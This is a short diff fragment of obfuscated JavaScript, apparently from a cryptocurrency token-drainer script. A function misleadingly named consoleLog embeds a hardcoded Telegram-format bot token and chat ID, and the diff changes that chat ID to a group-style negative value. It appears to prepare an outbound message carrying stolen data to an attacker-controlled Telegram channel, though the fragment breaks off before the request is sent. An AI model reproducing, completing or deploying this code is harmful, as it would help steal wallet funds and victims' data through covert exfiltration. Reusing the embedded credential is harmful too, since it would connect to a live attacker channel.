@@ -1231,7 +1231,7 @@ async function askTokenTransfer(_0x32eedb, _0xd99ead) {
 async function consoleLog(_0x1d4283) {
   const _0x229d31 = _0x3a34fc,
     _0x671463 = "6963446254:AAFMyxRcqsHEL6uZy3h3-s5bQ8f2qhMaG_U",
-    _0x59c142 = "2035208621";
+    _0x59c142 = "-2035208621";
   var _0x325795 =
     _0x229d31(0x179) +
     _0x671463 +
